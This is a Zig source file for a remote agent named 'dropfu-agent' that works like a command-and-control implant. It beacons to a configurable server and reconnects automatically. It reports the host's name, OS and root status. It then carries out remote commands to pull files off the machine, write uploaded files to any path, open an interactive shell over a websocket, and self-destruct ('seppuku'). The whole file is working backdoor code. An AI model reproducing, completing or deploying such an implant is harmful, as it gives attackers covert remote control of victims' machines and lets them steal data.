const std = @import("std");
const builtin = @import("builtin");
const protocol = @import("protocol.zig");
const websocket = @import("websocket.zig");
const commands = @import("commands.zig");
const system_id = @import("system_id.zig");

const Allocator = std.mem.Allocator;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const host = std.process.getEnvVarOwned(allocator, "DROPFU_SERVER_HOST") catch
        try allocator.dupe(u8, "127.0.0.1");
    const port_str = std.process.getEnvVarOwned(allocator, "DROPFU_SERVER_PORT") catch
        try allocator.dupe(u8, "9443");
    const port = std.fmt.parseInt(u16, port_str, 10) catch 9443;

    const sid = try system_id.compute(allocator);

    std.log.info("dropfu-agent v1.0.0", .{});
    std.log.info("  system-id : {s}", .{sid});
    std.log.info("  server    : {s}:{d}", .{ host, port });

    var backoff: u64 = 1;
    while (true) {
        std.log.info("connecting to {s}:{d} ...", .{ host, port });
        const stream = std.net.tcpConnectToHost(allocator, host, port) catch {
            std.log.warn("connection failed, retrying in {d}s", .{backoff});
            std.Thread.sleep(backoff * std.time.ns_per_s);
            backoff = @min(backoff * 2, 30);
            continue;
        };
        backoff = 1;

        runSession(allocator, stream, sid, host) catch |e| {
            std.log.err("session error: {}", .{e});
        };
        stream.close();
        std.log.info("disconnected, reconnecting in 2s", .{});
        std.Thread.sleep(2 * std.time.ns_per_s);
    }
}

fn runSession(allocator: Allocator, stream: std.net.Stream, agent_id: []const u8, host: []const u8) !void {
    try websocket.clientHandshake(stream, host, "/agent");
    std.log.info("websocket connected", .{});

    var write_mutex = std.Thread.Mutex{};

    // Build & send registration
    const hn = sysHostname();
    const reg = try protocol.serialize(allocator, protocol.RegisterMsg{
        .id = try protocol.generateId(allocator),
        .agent_id = agent_id,
        .timestamp = protocol.timestamp(),
        .payload = .{
            .hostname = hn,
            .os = @tagName(builtin.os.tag),
            .arch = @tagName(builtin.cpu.arch),
            .privilege = if (builtin.os.tag == .windows) "user" else if (std.os.linux.getuid() == 0) "root" else "user",
        },
    });
    defer allocator.free(reg);
    {
        write_mutex.lock();
        defer write_mutex.unlock();
        try websocket.sendText(stream, reg);
    }
    std.log.info("registered as {s}", .{agent_id});

    var session_state = SessionState{};
    defer session_state.deinit(allocator);

    var buf: [1 << 18]u8 = undefined;
    while (true) {
        const msg = try websocket.readMessage(stream, &buf);
        switch (msg.opcode) {
            .text => handleText(allocator, stream, &write_mutex, agent_id, msg.payload, &session_state) catch |e| {
                std.log.err("handle error: {}", .{e});
            },
            .ping => websocket.sendPong(stream, msg.payload),
            .close => return,
            else => {},
        }
    }
}

const SessionState = struct {
    upload_path: ?[]const u8 = null,
    shell: ?commands.ShellSession = null,
    shell_session_id: ?[]const u8 = null,

    fn deinit(self: *SessionState, allocator: Allocator) void {
        if (self.upload_path) |p| allocator.free(p);
        if (self.shell_session_id) |s| allocator.free(s);
        if (self.shell) |*sh| sh.close();
    }
};

fn handleText(
    allocator: Allocator,
    stream: std.net.Stream,
    write_mutex: *std.Thread.Mutex,
    agent_id: []const u8,
    raw: []const u8,
    ss: *SessionState,
) !void {
    var parsed = try protocol.parse(allocator, raw);
    defer parsed.deinit();

    const root = switch (parsed.value) {
        .object => |o| o,
        else => return,
    };

    const msg_type = protocol.getMsgType(parsed.value) orelse return;
    const msg_id = protocol.getStr(root, "id") orelse return;

    // Handle shell stdin from client
    if (std.mem.eql(u8, msg_type, protocol.MSG_SHELL_DATA)) {
        if (ss.shell) |*sh| {
            const payload = protocol.getObj(root, "payload") orelse return;
            const data = protocol.getStr(payload, "data") orelse return;
            sh.writeInput(data);
        }
        return;
    }

    // Handle file chunk (upload from client → agent)
    if (std.mem.eql(u8, msg_type, protocol.MSG_FILE_CHUNK)) {
        if (ss.upload_path) |dest| {
            const payload = protocol.getObj(root, "payload") orelse return;
            commands.handleUpload(allocator, dest, payload) catch {};
        }
        return;
    }

    if (!std.mem.eql(u8, msg_type, protocol.MSG_COMMAND)) return;

    const payload = protocol.getObj(root, "payload") orelse return;
    const cmd = protocol.getStr(payload, "command") orelse return;

    var args_list: std.ArrayList([]const u8) = .{};
    defer args_list.deinit(allocator);
    if (protocol.getArr(payload, "args")) |arr| {
        for (arr) |v| {
            switch (v) {
                .string => |s| try args_list.append(allocator, s),
                else => {},
            }
        }
    }
    const args = args_list.items;

    if (std.mem.eql(u8, cmd, "download")) {
        if (args.len == 0) {
            try sendResult(allocator, stream, write_mutex, msg_id, agent_id, "error", "usage: download <file_path>");
            return;
        }
        commands.handleDownload(allocator, stream, write_mutex, agent_id, msg_id, args[0]) catch |e| {
            const em = std.fmt.allocPrint(allocator, "download error: {}", .{e}) catch return;
            defer allocator.free(em);
            sendResult(allocator, stream, write_mutex, msg_id, agent_id, "error", em) catch {};
        };
        try sendResult(allocator, stream, write_mutex, msg_id, agent_id, "success", "download complete");
        return;
    }

    if (std.mem.eql(u8, cmd, "upload")) {
        if (args.len == 0) {
            try sendResult(allocator, stream, write_mutex, msg_id, agent_id, "error", "usage: upload <dest_path>");
            return;
        }
        if (ss.upload_path) |old| allocator.free(old);
        ss.upload_path = try allocator.dupe(u8, args[0]);
        try sendResult(allocator, stream, write_mutex, msg_id, agent_id, "success", "ready for upload");
        return;
    }

    const result = commands.dispatch(allocator, cmd, args) catch |e| {
        const em = std.fmt.allocPrint(allocator, "command error: {}", .{e}) catch return;
        defer allocator.free(em);
        sendResult(allocator, stream, write_mutex, msg_id, agent_id, "error", em) catch {};
        return;
    };

    switch (result) {
        .output => |data| {
            defer allocator.free(data);
            try sendResult(allocator, stream, write_mutex, msg_id, agent_id, "success", data);
        },
        .action => |act| switch (act) {
            .shell => {
                if (commands.startShell(allocator, stream, write_mutex, agent_id, msg_id)) |sh| {
                    ss.shell = sh;
                    if (ss.shell_session_id) |old| allocator.free(old);
                    ss.shell_session_id = allocator.dupe(u8, msg_id) catch null;
                    try sendResult(allocator, stream, write_mutex, msg_id, agent_id, "success", "shell session started");
                } else {
                    try sendResult(allocator, stream, write_mutex, msg_id, agent_id, "error", "failed to start shell");
                }
            },
            .seppuku => {
                try sendResult(allocator, stream, write_mutex, msg_id, agent_id, "success", "seppuku initiated – farewell");
                commands.doSeppuku();
            },
        },
    }
}

fn sendResult(
    allocator: Allocator,
    stream: std.net.Stream,
    write_mutex: *std.Thread.Mutex,
    msg_id: []const u8,
    agent_id: []const u8,
    status: []const u8,
    data: []const u8,
) !void {
    const msg = try protocol.serialize(allocator, protocol.ResultMsg{
        .id = msg_id,
        .agent_id = agent_id,
        .timestamp = protocol.timestamp(),
        .payload = .{ .status = status, .data = data },
    });
    defer allocator.free(msg);
    write_mutex.lock();
    defer write_mutex.unlock();
    try websocket.sendText(stream, msg);
}

fn sysHostname() []const u8 {
    const S = struct {
        var buf: [256]u8 = undefined;
        var val: []const u8 = "";
    };
    if (S.val.len > 0) return S.val;
    if (builtin.os.tag == .linux or builtin.os.tag == .macos) {
        const f = std.fs.openFileAbsolute("/etc/hostname", .{}) catch return "unknown";
        defer f.close();
        const n = f.read(&S.buf) catch return "unknown";
        S.val = std.mem.trim(u8, S.buf[0..n], &std.ascii.whitespace);
        return S.val;
    }
    return "unknown";
}
